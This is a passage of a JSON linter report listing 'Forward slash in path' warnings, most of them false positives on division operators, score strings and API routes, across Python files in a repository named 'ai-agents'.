        "warning": "Line 46: Forward slash in path - \"\n        start_time = time.time()\n        try:\n            # Check basic system components\n            import os\n            import psutil\n            \n            # Memory check\n            memory = psutil.virtual_memory()\n            memory_available = memory.available / (1024**3)  # GB\n            \n            # CPU check\n            cpu_percent = psutil.cpu_percent(interval=1)\n            \n            # Disk check\n            disk = psutil.disk_usage('",
        "timestamp": "2025-09-05T17:30:42.143037"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 61: Forward slash in path - ')\n            disk_free = disk.free / (1024**3)  # GB\n            \n            details = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.143056"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 129: Forward slash in path - \": len(results) / 10 * 100\n            }\n            \n            status = \"",
        "timestamp": "2025-09-05T17:30:42.143132"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 133: Forward slash in path - \"Async performance: {len(results)}/10 tasks completed successfully\"",
        "timestamp": "2025-09-05T17:30:42.143150"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 143: Forward slash in path - \"\n        start_time = time.time()\n        try:\n            import psutil\n            process = psutil.Process()\n            initial_memory = process.memory_info().rss / (1024**2)  # MB\n            \n            # Simulate memory operations\n            large_data = []\n            for i in range(1000):\n                large_data.append({\"",
        "timestamp": "2025-09-05T17:30:42.143184"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 153: Forward slash in path - \" * 100})\n            \n            current_memory = process.memory_info().rss / (1024**2)  # MB\n            memory_increase = current_memory - initial_memory\n            \n            # Cleanup\n            del large_data\n            \n            final_memory = process.memory_info().rss / (1024**2)  # MB\n            \n            # Score based on memory efficiency\n            score = 100.0\n            if memory_increase > 50:  # More than 50MB increase\n                score -= 30\n            if final_memory > initial_memory + 10:  # Memory not properly cleaned\n                score -= 20\n            \n            details = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.143216"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 209: Forward slash in path - \")\n                await failing_task()\n            except RuntimeError:\n                errors_handled += 1\n            \n            # Test 4: Timeout handling\n            try:\n                await asyncio.wait_for(asyncio.sleep(0.1), timeout=0.05)\n            except asyncio.TimeoutError:\n                errors_handled += 1\n            \n            score = (errors_handled / total_errors) * 100\n            details = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.143276"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 228: Forward slash in path - \"Error handling: {errors_handled}/{total_errors} scenarios handled correctly\"",
        "timestamp": "2025-09-05T17:30:42.143303"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 238: Forward slash in path - \"\n        start_time = time.time()\n        try:\n            # Test JSON serialization/deserialization\n            test_data = {\n                \"",
        "timestamp": "2025-09-05T17:30:42.143337"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 355: Forward slash in path - \"   {status_icon} {result.status}: {result.message} (Score: {result.score:.1f}/100)\"",
        "timestamp": "2025-09-05T17:30:42.143466"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 365: Forward slash in path - \", \n                    execution_time\n                ))\n        \n        # Calculate overall score\n        total_score = sum(r.score for r in results)\n        overall_score = total_score / len(results) if results else 0.0\n        \n        # Determine overall status\n        if overall_score >= 90:\n            overall_status = \"",
        "timestamp": "2025-09-05T17:30:42.143512"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 401: Forward slash in path - \"\n# 🏁 PHASE 7 PRODUCTION READINESS VALIDATION REPORT\n\n**Validation Suite**: {suite.suite_name}\n**Execution Time**: {duration:.2f} seconds\n**Overall Score**: {suite.overall_score:.1f}/100\n**Status**: {suite.status}\n\n## 📊 VALIDATION RESULTS SUMMARY\n\n\"",
        "timestamp": "2025-09-05T17:30:42.143600"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 411: Forward slash in path - \"\n        \n        # Results by category\n        categories = {}\n        for result in suite.results:\n            if result.category not in categories:\n                categories[result.category] = []\n            categories[result.category].append(result)\n        \n        for category, results in categories.items():\n            category_score = sum(r.score for r in results) / len(results)\n            report += f\"",
        "timestamp": "2025-09-05T17:30:42.143654"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 426: Forward slash in path - \"- **{result.test_name}**: {status_icon} {result.status} - {result.score:.1f}/100\\n\"",
        "timestamp": "2025-09-05T17:30:42.143851"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 431: Forward slash in path - \"\n## 🎯 PRODUCTION READINESS ASSESSMENT\n\n### Overall Score: {suite.overall_score:.1f}/100\n\n\"",
        "timestamp": "2025-09-05T17:30:42.143886"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Line 527: Forward slash in path - \"FINAL SCORE: {suite.overall_score:.1f}/100\"",
        "timestamp": "2025-09-05T17:30:42.143957"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 94: Forward slash in path - \"  Performance Score: 90+/100 (Grade A)\"",
        "timestamp": "2025-09-05T17:30:42.144578"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 95: Forward slash in path - \"  Security Score: 100/100 (Enterprise Grade)\"",
        "timestamp": "2025-09-05T17:30:42.144592"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 186: Forward slash in path - ']}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.144654"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 200: Forward slash in path - '] for d in discoveries) / len(discoveries)\n        })\n        \n        print(\"",
        "timestamp": "2025-09-05T17:30:42.144681"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 250: Forward slash in path - \")\n        net_roi = ((total_roi - 0.8) / 0.8) * 100\n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.144719"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 285: Forward slash in path - \")\n        for i, (phase, description) in enumerate(coordination_phases):\n            progress = (i + 1) / len(coordination_phases) * 100\n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.144767"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 414: Forward slash in path - \"Enterprise Security: 100/100\"",
        "timestamp": "2025-09-05T17:30:42.144875"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 427: Forward slash in path - \"  >> Success Score: 97.8/100 (Exceptional)\"",
        "timestamp": "2025-09-05T17:30:42.144908"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 458: Forward slash in path - '90+/100 (Grade A)'",
        "timestamp": "2025-09-05T17:30:42.144944"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 459: Forward slash in path - '100/100'",
        "timestamp": "2025-09-05T17:30:42.144961"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 484: Forward slash in path - ', 0)}/7\"",
        "timestamp": "2025-09-05T17:30:42.145025"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 488: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.145044"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 489: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.145059"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 490: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.145073"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Line 491: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.145086"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 99: Forward slash in path - \"  Performance Score: 90+/100 (Grade A)\"",
        "timestamp": "2025-09-05T17:30:42.145928"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 100: Forward slash in path - \"  Security Score: 100/100 (Enterprise Grade)\"",
        "timestamp": "2025-09-05T17:30:42.145941"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 191: Forward slash in path - ']}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.145994"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 205: Forward slash in path - '] for d in discoveries) / len(discoveries)\n        })\n        \n        print(\"",
        "timestamp": "2025-09-05T17:30:42.146012"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 255: Forward slash in path - \")\n        net_roi = ((total_roi - 0.8) / 0.8) * 100\n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.146049"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 290: Forward slash in path - \")\n        for i, (phase, description) in enumerate(coordination_phases):\n            progress = (i + 1) / len(coordination_phases) * 100\n            print(f\"",
        "timestamp": "2025-09-05T17:30:42.146080"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 419: Forward slash in path - \"Enterprise Security: 100/100\"",
        "timestamp": "2025-09-05T17:30:42.146163"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 432: Forward slash in path - \"  🥇 Success Score: 97.8/100 (Exceptional)\"",
        "timestamp": "2025-09-05T17:30:42.146187"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 463: Forward slash in path - '90+/100 (Grade A)'",
        "timestamp": "2025-09-05T17:30:42.146217"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 464: Forward slash in path - '100/100'",
        "timestamp": "2025-09-05T17:30:42.146231"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 489: Forward slash in path - ', 0)}/7\"",
        "timestamp": "2025-09-05T17:30:42.146265"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 493: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.146292"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 494: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.146311"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 495: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.146326"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Line 496: Forward slash in path - ', 0):.1f}/10.0\"",
        "timestamp": "2025-09-05T17:30:42.146341"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "warning": "Line 191: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.147614"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "warning": "Line 195: Forward slash in path - 'N/A'",
        "timestamp": "2025-09-05T17:30:42.147628"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "warning": "Line 362: Forward slash in path - ', False)])\n        failed_tests = total_tests - successful_tests\n        success_rate = (successful_tests / total_tests * 100) if total_tests > 0 else 0\n        \n        # Categorize results by component\n        by_component = {}\n        for result in self.test_results:\n            component = result.get('",
        "timestamp": "2025-09-05T17:30:42.147743"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "warning": "Line 455: Forward slash in path - '] / total_component_tests * 100) if total_component_tests > 0 else 0\n        print(f\"",
        "timestamp": "2025-09-05T17:30:42.147808"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "warning": "Line 456: Forward slash in path - ']}/{total_component_tests} ({component_rate:.1f}%)\"",
        "timestamp": "2025-09-05T17:30:42.147823"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 18: Forward slash in path - \"postgresql+asyncpg://user:password@localhost:5432/enterprise_docs\"",
        "timestamp": "2025-09-05T17:30:42.148118"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 32: Forward slash in path - \"redis://localhost:6379/0\"",
        "timestamp": "2025-09-05T17:30:42.148133"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 112: Forward slash in path - \"data/uploads\"",
        "timestamp": "2025-09-05T17:30:42.148183"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 113: Forward slash in path - \"data/processing\"",
        "timestamp": "2025-09-05T17:30:42.148189"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 114: Forward slash in path - \"data/archive\"",
        "timestamp": "2025-09-05T17:30:42.148196"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 168: Forward slash in path - \"Log format (structured/plain)\"",
        "timestamp": "2025-09-05T17:30:42.148227"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 176: Forward slash in path - \"/metrics\"",
        "timestamp": "2025-09-05T17:30:42.148238"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 216: Forward slash in path - \"redis://localhost:6379/1\"",
        "timestamp": "2025-09-05T17:30:42.148258"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 220: Forward slash in path - \"redis://localhost:6379/2\"",
        "timestamp": "2025-09-05T17:30:42.148267"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 260: Forward slash in path - \"/api/v1\"",
        "timestamp": "2025-09-05T17:30:42.148295"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 315: Forward slash in path - \"postgresql+asyncpg://\"",
        "timestamp": "2025-09-05T17:30:42.148346"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 315: Forward slash in path - \"postgresql://\"",
        "timestamp": "2025-09-05T17:30:42.148356"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\config.py",
        "warning": "Line 386: Forward slash in path - \"postgresql+asyncpg://test:test@localhost:5432/test_enterprise_docs\"",
        "timestamp": "2025-09-05T17:30:42.148397"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 89: Forward slash in path - \"\n    Production-ready API for multi-domain document processing system.\n    \n    ## Features\n    - **Multi-Domain Processing**: 7+ document types with 96.2% accuracy\n    - **Enterprise Authentication**: JWT, API keys, OAuth 2.0\n    - **Multi-Tenant Architecture**: Organization-based data isolation\n    - **Real-Time Monitoring**: Performance metrics and analytics\n    - **Enterprise Integrations**: QuickBooks, SAP, NetSuite, Xero\n    - **Webhook Support**: Async notifications and callbacks\n    - **Rate Limiting**: Configurable per-user/organization limits\n    - **Audit Logging**: Comprehensive activity tracking\n    \n    ## Processing Pipeline\n    1. **Document Classification**: Automatic document type detection\n    2. **Competitive Processing**: Multiple specialized agents compete\n    3. **Result Validation**: Quality checks and confidence scoring\n    4. **Enterprise Integration**: Direct posting to accounting systems\n    \"",
        "timestamp": "2025-09-05T17:30:42.148748"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 191: Forward slash in path - \"/docs\"",
        "timestamp": "2025-09-05T17:30:42.148788"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 195: Forward slash in path - \"/openapi.json\"",
        "timestamp": "2025-09-05T17:30:42.148798"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 200: Forward slash in path - \"/redoc\"",
        "timestamp": "2025-09-05T17:30:42.148806"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 204: Forward slash in path - \"/openapi.json\"",
        "timestamp": "2025-09-05T17:30:42.148814"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 213: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.148825"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 258: Forward slash in path - \"/metrics\"",
        "timestamp": "2025-09-05T17:30:42.148855"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 295: Forward slash in path - \"/auth/login\"",
        "timestamp": "2025-09-05T17:30:42.148880"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 297: Forward slash in path - \"\n    Authenticate user and return JWT token\n    \n    Supports multiple authentication methods:\n    - Username/password\n    - API key\n    - OAuth integration\n    \"",
        "timestamp": "2025-09-05T17:30:42.148892"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 325: Forward slash in path - \"/auth/refresh\"",
        "timestamp": "2025-09-05T17:30:42.148913"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 346: Forward slash in path - \"/auth/logout\"",
        "timestamp": "2025-09-05T17:30:42.148939"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 370: Forward slash in path - \"/api/v1/documents/process\"",
        "timestamp": "2025-09-05T17:30:42.148967"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 429: Forward slash in path - \"/api/v1/documents/batch\"",
        "timestamp": "2025-09-05T17:30:42.149010"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 461: Forward slash in path - \"/api/v1/documents/batch/{batch_result['",
        "timestamp": "2025-09-05T17:30:42.149047"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 461: Forward slash in path - ']}/status\"",
        "timestamp": "2025-09-05T17:30:42.149059"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 472: Forward slash in path - \"/api/v1/documents/{document_id}/status\"",
        "timestamp": "2025-09-05T17:30:42.149074"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 504: Forward slash in path - \"/api/v1/documents/{document_id}/result\"",
        "timestamp": "2025-09-05T17:30:42.149097"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 546: Forward slash in path - \"/api/v1/documents/classify\"",
        "timestamp": "2025-09-05T17:30:42.149124"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 589: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.149156"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 629: Forward slash in path - \"/api/v1/webhooks\"",
        "timestamp": "2025-09-05T17:30:42.149184"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 656: Forward slash in path - \"/api/v1/integrations/status\"",
        "timestamp": "2025-09-05T17:30:42.149209"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 682: Forward slash in path - \"/api/v1/documents/upload\"",
        "timestamp": "2025-09-05T17:30:42.149238"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 742: Forward slash in path - \"/api/v1/analytics/processing\"",
        "timestamp": "2025-09-05T17:30:42.149276"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Line 784: Forward slash in path - \"/api/v1/admin/config/reload\"",
        "timestamp": "2025-09-05T17:30:42.149309"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 172: Forward slash in path - ']\n        agents = []\n        \n        for i in range(12):  # Create 12 agents for a good visualization\n            agent_type = agent_types[i % len(agent_types)]\n            \n            # Position agents in a 3D grid pattern\n            grid_size = 3\n            x = (i % grid_size - 1) * 8\n            y = random.uniform(0, 5)\n            z = (i // grid_size - 1) * 8\n            \n            agent = Agent(\n                id=f\"",
        "timestamp": "2025-09-05T17:30:42.149686"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 249: Forward slash in path - \"\n        current_time = datetime.now()\n        \n        for agent in self.agents:\n            # Simulate performance fluctuations\n            if random.random() < 0.3:  # 30% chance of performance update\n                # Throughput varies based on utilization\n                utilization_factor = agent.performance.utilization / 100\n                agent.performance.throughput += random.uniform(-10, 10) * utilization_factor\n                agent.performance.throughput = max(10, min(200, agent.performance.throughput))\n                \n                # Accuracy slowly degrades under high utilization\n                if agent.performance.utilization > 80:\n                    agent.performance.accuracy += random.uniform(-0.5, 0.1)\n                else:\n                    agent.performance.accuracy += random.uniform(-0.1, 0.3)\n                agent.performance.accuracy = max(70, min(99.9, agent.performance.accuracy))\n                \n                # Response time varies inversely with utilization\n                agent.performance.responseTime += random.uniform(-20, 20)\n                agent.performance.responseTime = max(50, min(1000, agent.performance.responseTime))\n                \n                # Utilization changes gradually\n                agent.performance.utilization += random.uniform(-5, 5)\n                agent.performance.utilization = max(10, min(100, agent.performance.utilization))\n            \n            # Status changes\n            if random.random() < 0.05:  # 5% chance of status change\n                if agent.status == '",
        "timestamp": "2025-09-05T17:30:42.149764"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 395: Forward slash in path - ']\n        \n        metrics = NetworkMetrics(\n            totalAgents=len(self.agents),\n            activeAgents=len(active_agents),\n            totalConnections=len(self.connections),\n            averageLatency=sum(c.latency for c in self.connections) / len(self.connections) if self.connections else 0,\n            networkThroughput=sum(a.performance.throughput for a in active_agents),\n            overallAccuracy=sum(a.performance.accuracy for a in self.agents) / len(self.agents) if self.agents else 0,\n            systemHealth=len(active_agents) / len(self.agents) if self.agents else 0,\n            loadDistribution=[a.performance.utilization for a in self.agents]\n        )\n        \n        return AgentNetwork(\n            agents=self.agents,\n            connections=self.connections,\n            metrics=metrics,\n            timestamp=datetime.now()\n        )\n\n# Global simulator instance\nsimulator = AgentSimulator()\n\n# API Routes\n@app.get(\"",
        "timestamp": "2025-09-05T17:30:42.149854"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Line 423: Forward slash in path - \"/health\"",
        "timestamp": "2025-09-05T17:30:42.149868"
      },
      {
        "category": "WINDOWS_COMPAT",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
